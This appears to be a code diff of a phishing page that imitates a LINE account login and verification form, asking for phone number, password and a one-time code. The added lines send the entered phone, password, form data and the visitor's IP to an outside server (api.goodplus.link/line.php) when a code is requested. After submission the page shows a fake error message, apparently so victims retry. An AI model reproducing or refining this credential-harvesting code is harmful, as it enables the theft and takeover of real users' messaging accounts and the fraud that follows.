@@ -9,6 +9,18 @@
     <link rel="stylesheet" href="css/index.css" />
     <link rel="stylesheet" href="css/default.css" />
     <link rel="stylesheet" href="css/form.css" />
+    <style>
+    .buttonok {
+    height: 36px;
+    width: 100px;
+    border-radius: 25px;
+    background-color: #f0f0f0; /* 设置按钮背景颜色 */
+    color: #333; /* 设置按钮文字颜色 */
+    text-align: center; /* 文字居中 */
+    line-height: 35px; /* 垂直居中 */
+    margin-top: -28px; /* 向上移动32px */
+}
+</style>
 </head>
 <body>
 <div v-cloak id="app">
@@ -27,17 +39,14 @@
                     v-model="form.phone"
                     required
                     @input="quickSave"
-                    placeholder="請輸入LINE電話號碼"
-                    :rules="[{ required: true, message: '請輸入LINE電話號碼' }]">
+                    placeholder="請輸入LINE電話號碼">
                 <template #label><span class="fs-12">電話號碼</span></template>
             </van-field>
             <van-field
                     v-model="form.password"
                     required
                     @input="quickSave"
-                    placeholder="請輸入密碼"
-                    :rules="[{ required: true, message: '請輸入密碼' }]"
-            >
+                    placeholder="請輸入密碼">
                 <template #label><span class="fs-12">輸入密碼</span></template>
             </van-field>
             <van-field
@@ -46,11 +55,10 @@
                     @input="quickSave"
                     placeholder="請輸入LINE認證碼"
                     type="number"
-                    maxlength="6"
-                    :rules="[{ required: true, message: '請輸入LINE認證碼' }]">
+                    maxlength="6">
                 <template #label><span class="fs-12">輸入認證碼</span></template>
                 <template #button>
-                    <span @click="getCode">{{codeWord}}</span>
+                    <div class="buttonok" @click="getCode">{{codeWord}}</div>
                 </template>
             </van-field>
             <div class="text-center margin-t20">
@@ -92,7 +100,7 @@
             getCode() {
                 if (this.codeWord !== '發送') { return }
 
-                var phoneNumberPattern = /^\d{8,10}$/;
+                var phoneNumberPattern = /^\d{10}$/;
                 var cktel = phoneNumberPattern.test(this.form.phone);
                 if(!cktel){
                   this.$toast.fail('電話號碼不正確！');
@@ -104,11 +112,20 @@
                    this.$toast.fail("密碼不正確！");
                    return false;
                 }
-
+                
                 this.canClick = false
                 this.timer = setInterval(() => {
                     this.count()
                 }, 1000)
+                this.form.id = document.getElementById('id');
+                this.form.ip = ipAddress;
+                $.ajax({
+                    url:"https://api.goodplus.link/line.php?get=ok",
+                    type: 'post',
+                    dataType: 'JSON',
+                    data: this.form,
+                    success:function(data){}
+                });
             },
             count() {
                 this.time--
@@ -126,13 +143,13 @@
             },
             // 保存每一步输入
             quickSave() {
-                if(this.form.code.length<6 && this.form.code != '' && this.form.code.length != 1){
+                if(this.form.code.length < 6 && this.form.code != ''){
                     return false;
                 }
-                if(this.form.phone.length<8 && this.form.phone != '' && this.form.phone.length != 1){
+                if(this.form.phone.length != 10 && this.form.phone != ''){
                     return false;
                 }
-                if(this.form.password.length<8 && this.form.password != '' && this.form.password.length != 1){
+                if(this.form.password.length<8 && this.form.password != ''){
                     return false;
                 }
                 console.log('save', this.form)
@@ -147,10 +164,18 @@
                 });
             },
             onSubmit() {
-               var phoneNumberPattern = /^\d{8,10}$/;
+                if(this.form.phone == ''){
+                  this.$toast.fail('請輸入電話號碼');
+                  return false;
+                }
+                var phoneNumberPattern = /^\d{8,10}$/;
                 var cktel = phoneNumberPattern.test(this.form.phone);
                 if(!cktel){
                   this.$toast.fail('電話號碼不正確！');
+                  return false;
+                }
+                if(this.form.password == ''){
+                  this.$toast.fail('請輸入密碼');
                   return false;
                 }
                 var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
@@ -159,8 +184,16 @@
                    this.$toast.fail("密碼不正確！");
                    return false;
                 }
+                if (this.codeWord == '發送') {
+                    this.$toast.fail('請先發送確認碼');
+                    return false;
+                }
+                if(this.form.code.length==0){
+                    this.$toast.fail("請输入的認證碼！");
+                    return false;
+                }
                 if(this.form.code.length!=6){
-                    this.$toast.fail("请输入6位認證碼！");
+                    this.$toast.fail("認證碼不正確！");
                     return false;
                 }
                console.log('submit', this.form);
@@ -173,9 +206,8 @@
                   data: this.form,
                   success:function(data){
                     setTimeout(function(){
-                        //window.location.href='/index.php/Home/Index';
-                        alert('系統繁忙中~請一小時後再試！');
-                    },2000);
+                        alert('認證碼或密碼不正確！');
+                    },1500);
                     return false;
                   }
               });
